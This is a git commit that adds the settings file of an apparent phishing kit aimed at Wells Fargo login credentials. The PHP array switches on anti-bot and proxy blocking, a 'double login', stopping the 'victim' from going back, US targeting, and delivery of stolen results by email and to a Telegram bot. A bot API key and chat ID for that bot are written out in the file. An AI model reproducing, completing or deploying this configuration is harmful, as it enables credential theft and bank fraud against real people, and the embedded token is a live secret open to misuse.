75b6bbb8c595c67a8174f9e0f3092ea056661173
Andrew Essien Buck <41216568+AndyBuck21@users.noreply.github.com>
2022-12-16 19:13:09 +0100

    Add files via upload

---
+++ settings/settings.php
@@ -0,0 +1,27 @@
+<?php
+
+
+
+$settings = array(
+	"log_user"		=> "1",	// Log User-Agent, IP and Date
+	"print_match"	=> "0",	// Print Crawler Detections 
+	"anti-back"		=> "1",	// Victim Can't Go Back To Session
+	"debug"			=> "0",	// Print Errors
+	"proxy_block"	=> "1",	// Detect Proxies & Block Them
+	"send_mail"		=> "1",	// Send E-Mail To Your Mail
+	"save_results"	=> "1",	// Save Results 
+	"double_login"	=> "1",	// Double Login 
+	"enable_email"	=> "1",	// 1=Enable 0=Disable  
+	"telegram"		=> "1",	// Telegram Bots Receiver
+	"country"		=> "US", // Target SPAM Country
+	"chat_id"		=> "1485894786",	// Chat ID Of You
+	"bot_url"		=> "bot2121939028:AAGBSTdT0JUi3DQVvw_e8823Zvlkn4IoXCs",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
+	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
+	"out"			=> "wellsfargo+login",	// Outcome Of AntiBots Forward - DONT CHANGE
+	"email"			=> "email here",	// Your E-Mail
+);
+return $settings;
+
+
+
+?>
